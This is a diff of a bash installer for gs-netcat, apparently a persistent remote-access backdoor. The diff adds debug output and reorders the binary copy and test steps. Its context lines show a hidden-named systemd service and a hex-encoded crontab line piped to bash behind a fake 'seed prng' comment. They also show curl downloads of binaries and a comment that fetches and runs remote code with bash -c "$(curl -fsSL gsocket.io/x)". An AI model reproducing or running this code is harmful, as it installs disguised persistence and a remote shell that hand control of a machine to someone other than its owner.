@@ -41,6 +41,12 @@ CC="\033[1;36m" # cyan
 CM="\033[1;35m" # magenta
 CN="\033[0m"    # none
 
+if [[ -z $GS_DEBUG ]]; then
+	DEBUGF(){ :;}
+else
+	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
+fi
+
 exit_clean()
 {
 	[[ "${#TMPDIR}" -gt 5 ]] && { rm -rf "${TMPDIR:?}/"*; rmdir "${TMPDIR}"; } &>/dev/null
@@ -169,6 +175,8 @@ init_vars()
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
 
+	DEBUGF "SRC_PKG=$SRC_PKG"
+
 }
 
 init_setup()
@@ -216,7 +224,8 @@ init_setup()
 
 		p="$(echo "$CRONTAB_LINE" | xxd -ps -c1024)"
 		CRONTAB_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
-	fi	
+	fi
+	DEBUGF "TMPDIR=${TMPDIR}"
 }
 
 uninstall_rm()
@@ -500,7 +509,7 @@ dl()
 	fi
 
 	# Debugging / testing. Use local package if available
-	[[ -n "$GS_DEBUG" ]] && [[ -f "../tools/${1}" ]] && cp "../tools/${1}" "${2}" 2>/dev/null && return
+	[[ -n "$GS_DEBUG" ]] && [[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
 
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
 		dl_log=$(curl -fL "${URL_BASE}/${1}" --output "${2}" 2>&1)
@@ -523,7 +532,8 @@ gs_access()
 	local ret
 	GS_SECRET="${S}"
 
-	"${TMPDIR}/gs-netcat" -s "${GS_SECRET}" -i
+	# "${TMPDIR}/gs-netcat" -s "${GS_SECRET}" -i
+	"${DSTBIN}" -s "${GS_SECRET}" -i
 	ret=$?
 	[[ $ret -eq 139 ]] && { EXECFAIL_OUT "$?" "SIGSEGV"; errexit; }
 
@@ -572,17 +582,17 @@ echo -en 2>&1 "Unpacking binaries...............................................
 (cd "${TMPDIR}" && tar xfz "${SRC_PKG}" && chmod 700 "${TMPDIR}/gs-netcat") || { FAIL_OUT "unpacking failed"; errexit; }
 OK_OUT
 
-echo -en 2>&1 "Testing binaries......................................................"
-test_binaries "${TMPDIR}/gs-netcat" "${S}" # Also sets GS_SECRET
-OK_OUT
-
-# S= is set. Do not install but connect to remote using S= as secret.
-[[ -n $S ]] && gs_access
-
 echo -en 2>&1 "Copying binaries......................................................"
 mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
 chmod 700 "$DSTBIN"
 OK_OUT
+
+echo -en 2>&1 "Testing binaries......................................................"
+test_binaries "${DSTBIN}" "${S}" # Also sets GS_SECRET
+OK_OUT
+
+# S= is set. Do not install but connect to remote using S= as secret.
+[[ -n $S ]] && gs_access
 
 # User supplied secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
 [[ -n $X ]] && GS_SECRET="$X"
